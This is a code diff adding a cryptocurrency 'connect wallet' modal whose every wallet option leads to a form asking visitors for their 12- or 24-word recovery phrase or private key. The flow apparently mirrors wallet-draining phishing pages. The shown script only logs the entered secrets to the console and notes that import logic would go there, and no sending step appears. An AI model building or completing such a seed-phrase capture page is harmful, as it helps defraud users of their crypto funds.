+        // Open modal
+        document.querySelectorAll('.connect-wallet-header, .connect-wallet-main').forEach(btn => {
+            btn.addEventListener('click', function() {
+                walletModal.classList.add('active');
+                document.body.style.overflow = 'hidden';
+            });
+        });
+
+        // Close modal
+        closeModal.addEventListener('click', function() {
+            walletModal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+        });
+
+        // Close modal clicking outside
+        walletModal.addEventListener('click', function(e) {
+            if (e.target === walletModal) {
+                walletModal.classList.remove('active');
+                document.body.style.overflow = 'auto';
+            }
+        });
+
+        // Wallet item clicks
+        document.querySelectorAll('.wallet-item').forEach(item => {
+            item.addEventListener('click', function() {
+                console.log('Wallet selected:', this.querySelector('.wallet-name').textContent.trim());
+                // Here you would handle wallet connection
+            });
+        });
+
+        // Social login click
+        document.querySelector('.social-login').addEventListener('click', function() {
+            console.log('Social login clicked');
+            // Here you would handle social login
+        });
+
+        // Learn button click
+        document.querySelector('.learn-button').addEventListener('click', function() {
+            console.log('Learn how to connect clicked');
+            // Here you would open help/tutorial
+        });
+    </script>
+    <!-- Modal Import Wallet -->
+<div class="modal-overlay" id="importWalletModal">
+    <div class="modal-container import-modal">
+        <button class="modal-close" id="closeImportModal">×</button>
+        
+        <div class="import-content">
+            <div class="back-button" id="backToWallet">
+                <i class="fas fa-arrow-left"></i>
+                Atrás
+            </div>
+            
+            <h2 class="import-title">Import with Secret Phrase or Private Key</h2>
+            
+            <div class="wallet-name-section">
+                <label class="input-label">Wallet Name</label>
+                <div class="wallet-name-input">
+                    <input type="text" value="Main wallet" placeholder="Enter wallet name">
+                    <button class="clear-input">×</button>
+                </div>
+                <div class="helper-text">You can edit this later</div>
+            </div>
+
+            <div class="import-method-section">
+                <label class="input-label">Enter Secret Phrase or Private Key</label>
+                
+                <!-- Recovery Phrase Grid -->
+                <div class="recovery-phrase-container" id="recoveryPhraseContainer">
+                    <div class="phrase-grid" id="phraseGrid">
+                        <div class="phrase-item">
+                            <span class="phrase-number">1.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">2.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">3.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">4.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">5.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">6.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">7.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">8.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">9.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">10.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">11.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                        <div class="phrase-item">
+                            <span class="phrase-number">12.</span>
+                            <input type="text" class="phrase-input" placeholder="">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Private Key Input -->
+                <div class="private-key-container" id="privateKeyContainer" style="display: none;">
+                    <textarea class="private-key-input" placeholder="Enter your private key"></textarea>
+                </div>
+
+                <div class="switch-container">
+                    <button class="switch-method-btn" id="switchToPrivateKey">
+                        Use Private Key instead
+                    </button>
+                    <button class="word-count-btn" id="use24Words">
+                        I have a 24-word recovery phrase
+                    </button>
+                </div>
+
+                <div class="helper-info">
+                    <div class="info-text">
+                        Secret Recovery Phrase is typically 12 (sometimes 18, 24) words separated by single spaces<br>
+                        Private Key is a long alphanumeric code
+                    </div>
+                </div>
+            </div>
+
+            <div class="import-actions">
+                <button class="import-btn" id="importWalletBtn">Import Wallet</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.import-modal {
+    max-width: 500px;
+    width: 95%;
+    max-height: 95vh;
+    overflow-y: auto;
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 0;
+    margin: 20px auto;
+    position: relative;
+    box-sizing: border-box;
+}
+
+.import-content {
+    padding: 24px;
+    box-sizing: border-box;
+    width: 100%;
+}
+
+.back-button {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #6b7280;
+    font-size: 14px;
+    cursor: pointer;
+    margin-bottom: 20px;
+    transition: color 0.2s;
+}
+
+.back-button:hover {
+    color: #374151;
+}
+
+.import-title {
+    font-size: 22px;
+    font-weight: 600;
+    color: #111827;
+    margin-bottom: 20px;
+    margin-top: 0;
+    line-height: 1.3;
+}
+
+.wallet-name-section {
+    margin-bottom: 20px;
+}
+
+.input-label {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: #374151;
+    margin-bottom: 8px;
+}
+
+.wallet-name-input {
+    position: relative;
+    display: flex;
+    align-items: center;
+    width: 100%;
+}
+
+.wallet-name-input input {
+    width: 100%;
+    padding: 12px 40px 12px 16px;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    font-size: 14px;
+    background: #ffffff;
+    outline: none;
+    transition: border-color 0.2s;
+    box-sizing: border-box;
+}
+
+.wallet-name-input input:focus {
+    border-color: #3b82f6;
+}
+
+.clear-input {
+    position: absolute;
+    right: 12px;
+    background: none;
+    border: none;
+    color: #9ca3af;
+    font-size: 18px;
+    cursor: pointer;
+    padding: 0;
+    width: 20px;
+    height: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.helper-text {
+    font-size: 12px;
+    color: #6b7280;
+    margin-top: 6px;
+}
+
+.import-method-section {
+    margin-bottom: 20px;
+}
+
+.recovery-phrase-container {
+    margin-bottom: 16px;
+    width: 100%;
+}
+
+.phrase-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 10px;
+    margin-bottom: 16px;
+    width: 100%;
+}
+
+.phrase-item {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: #f9fafb;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    padding: 10px 12px;
+    transition: border-color 0.2s;
+    min-width: 0;
+    box-sizing: border-box;
+}
+
+.phrase-item:focus-within {
+    border-color: #3b82f6;
+    background: #ffffff;
+}
+
+.phrase-number {
+    font-size: 12px;
+    color: #6b7280;
+    font-weight: 500;
+    min-width: 20px;
+    flex-shrink: 0;
+}
+
+.phrase-input {
+    border: none;
+    background: transparent;
+    outline: none;
+    font-size: 13px;
+    color: #111827;
+    flex: 1;
+    padding: 0;
+    min-width: 0;
+    width: 100%;
+}
+
+.phrase-input::placeholder {
+    color: #9ca3af;
+}
+
+.private-key-container {
+    margin-bottom: 16px;
+    width: 100%;
+}
+
+.private-key-input {
+    width: 100%;
+    min-height: 120px;
+    padding: 12px 16px;
+    border: 1px solid #d1d5db;
+    border-radius: 8px;
+    font-size: 14px;
+    font-family: 'Courier New', monospace;
+    background: #ffffff;
+    outline: none;
+    resize: vertical;
+    transition: border-color 0.2s;
+    box-sizing: border-box;
+}
+
+.private-key-input:focus {
+    border-color: #3b82f6;
+}
+
+.switch-container {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-bottom: 16px;
+}
+
+.switch-method-btn,
+.word-count-btn {
+    background: none;
+    border: none;
+    color: #3b82f6;
+    font-size: 14px;
+    cursor: pointer;
+    text-align: left;
+    padding: 4px 0;
+    transition: color 0.2s;
+}
+
+.switch-method-btn:hover,
+.word-count-btn:hover {
+    color: #2563eb;
+    text-decoration: underline;
+}
+
+.helper-info {
+    background: #f8fafc;
+    border: 1px solid #e2e8f0;
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 16px;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.info-text {
+    font-size: 12px;
+    color: #64748b;
+    line-height: 1.4;
+}
+
+.import-actions {
+    display: flex;
+    justify-content: center;
+    width: 100%;
+}
+
+.import-btn {
+    background: #3b82f6;
+    color: white;
+    border: none;
+    padding: 12px 32px;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    min-width: 150px;
+}
+
+.import-btn:hover {
+    background: #2563eb;
+}
+
+.import-btn:disabled {
+    background: #9ca3af;
+    cursor: not-allowed;
+}
+
+/* Responsive para móviles */
+@media (max-width: 768px) {
+    .import-modal {
+        width: 95%;
+        max-width: none;
+        margin: 10px auto;
+        max-height: 98vh;
+        border-radius: 12px;
+    }
+    
+    .import-content {
+        padding: 20px 16px;
+    }
+    
+    .import-title {
+        font-size: 20px;
+        margin-bottom: 18px;
+    }
+    
+    .phrase-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 8px;
+    }
+    
+    .phrase-item {
+        padding: 8px 10px;
+        gap: 4px;
+    }
+    
+    .phrase-number {
+        min-width: 18px;
+        font-size: 11px;
+    }
+    
+    .phrase-input {
+        font-size: 12px;
+    }
+    
+    .wallet-name-section,
+    .import-method-section {
+        margin-bottom: 18px;
+    }
+    
+    .import-btn {
+        width: 100%;
+        min-width: unset;
+        padding: 14px 24px;
+    }
+}
+
+/* Responsive para pantallas muy pequeñas */
+@media (max-width: 480px) {
+    .import-modal {
+        width: 98%;
+        margin: 5px auto;
+        max-height: 99vh;
+        border-radius: 8px;
+    }
+    
+    .import-content {
+        padding: 16px 12px;
+    }
+    
+    .import-title {
+        font-size: 18px;
+        margin-bottom: 16px;
+    }
+    
+    .phrase-grid {
+        grid-template-columns: 1fr;
+        gap: 6px;
+    }
+    
+    .phrase-item {
+        padding: 10px 12px;
+    }
+    
+    .helper-info {
+        padding: 10px;
+    }
+    
+    .info-text {
+        font-size: 11px;
+    }
+    
+    .back-button {
+        font-size: 13px;
+        margin-bottom: 16px;
+    }
+}
+
+/* Responsive para tablets */
+@media (min-width: 769px) and (max-width: 1024px) {
+    .import-modal {
+        max-width: 480px;
+        width: 90%;
+    }
+    
+    .phrase-grid {
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+    }
+}
+</style>
+
+<script>
+// Variables para el modal de importar
+const importWalletModal = document.getElementById('importWalletModal');
+const closeImportModal = document.getElementById('closeImportModal');
+const backToWallet = document.getElementById('backToWallet');
+const switchToPrivateKey = document.getElementById('switchToPrivateKey');
+const use24Words = document.getElementById('use24Words');
+const phraseGrid = document.getElementById('phraseGrid');
+const recoveryPhraseContainer = document.getElementById('recoveryPhraseContainer');
+const privateKeyContainer = document.getElementById('privateKeyContainer');
+
+let currentMode = 'phrase'; // 'phrase' or 'private'
+let wordCount = 12; // 12 or 24
+
+// Función para crear los inputs de la frase
+function createPhraseInputs(count) {
+    phraseGrid.innerHTML = '';
+    for (let i = 1; i <= count; i++) {
+        const phraseItem = document.createElement('div');
+        phraseItem.className = 'phrase-item';
+        phraseItem.innerHTML = `
+            <span class="phrase-number">${i}.</span>
+            <input type="text" class="phrase-input" placeholder="">
+        `;
+        phraseGrid.appendChild(phraseItem);
+    }
+}
+
+// Abrir modal de importar desde cualquier wallet
+document.querySelectorAll('.wallet-item').forEach(item => {
+    item.addEventListener('click', function() {
+        // Cerrar modal principal
+        document.getElementById('walletModal').classList.remove('active');
+        
+        // Abrir modal de importar
+        setTimeout(() => {
+            importWalletModal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }, 200);
+    });
+});
+
+// Cerrar modal de importar
+closeImportModal.addEventListener('click', function() {
+    importWalletModal.classList.remove('active');
+    document.body.style.overflow = 'auto';
+});
+
+// Volver al modal principal
+backToWallet.addEventListener('click', function() {
+    importWalletModal.classList.remove('active');
+    setTimeout(() => {
+        document.getElementById('walletModal').classList.add('active');
+    }, 200);
+});
+
+// Cerrar modal clickeando fuera
+importWalletModal.addEventListener('click', function(e) {
+    if (e.target === importWalletModal) {
+        importWalletModal.classList.remove('active');
+        document.body.style.overflow = 'auto';
+    }
+});
+
+// Cambiar entre frase secreta y clave privada
+switchToPrivateKey.addEventListener('click', function() {
+    if (currentMode === 'phrase') {
+        // Cambiar a private key
+        recoveryPhraseContainer.style.display = 'none';
+        privateKeyContainer.style.display = 'block';
+        this.textContent = 'Use Recovery Phrase instead';
+        use24Words.style.display = 'none';
+        currentMode = 'private';
+    } else {
+        // Cambiar a phrase
+        recoveryPhraseContainer.style.display = 'block';
+        privateKeyContainer.style.display = 'none';
+        this.textContent = 'Use Private Key instead';
+        use24Words.style.display = 'block';
+        currentMode = 'phrase';
+    }
+});
+
+// Cambiar entre 12 y 24 palabras
+use24Words.addEventListener('click', function() {
+    if (wordCount === 12) {
+        wordCount = 24;
+        createPhraseInputs(24);
+        this.textContent = 'I have a 12-word recovery phrase';
+    } else {
+        wordCount = 12;
+        createPhraseInputs(12);
+        this.textContent = 'I have a 24-word recovery phrase';
+    }
+});
+
+// Botón de importar wallet
+document.getElementById('importWalletBtn').addEventListener('click', function() {
+    if (currentMode === 'phrase') {
+        const phrases = [];
+        document.querySelectorAll('.phrase-input').forEach(input => {
+            phrases.push(input.value.trim());
+        });
+        console.log('Recovery phrase:', phrases);
+    } else {
+        const privateKey = document.querySelector('.private-key-input').value.trim();
+        console.log('Private key:', privateKey);
+    }
+    
+    // Aquí implementarías la lógica de importación
+    alert('Wallet import functionality would be implemented here');
+});
+
+// Funcionalidad para navegar entre inputs con Tab o Enter
+document.addEventListener('keydown', function(e) {
+    if (e.target.classList.contains('phrase-input')) {
+        if (e.key === 'Enter' || e.key === 'Tab') {
+            e.preventDefault();
+            const inputs = Array.from(document.querySelectorAll('.phrase-input'));
+            const currentIndex = inputs.indexOf(e.target);
+            const nextIndex = currentIndex + 1;
+            
+            if (nextIndex < inputs.length) {
+                inputs[nextIndex].focus();
+            }
+        }
+    }
+});
+
+// Limpiar input del nombre del wallet
+document.querySelector('.clear-input').addEventListener('click', function() {
+    document.querySelector('.wallet-name-input input').value = '';
+    document.querySelector('.wallet-name-input input').focus();
+});
+
+// Inicializar con 12 palabras por defecto
+createPhraseInputs(12);
+</script>
+</body>
+</html>
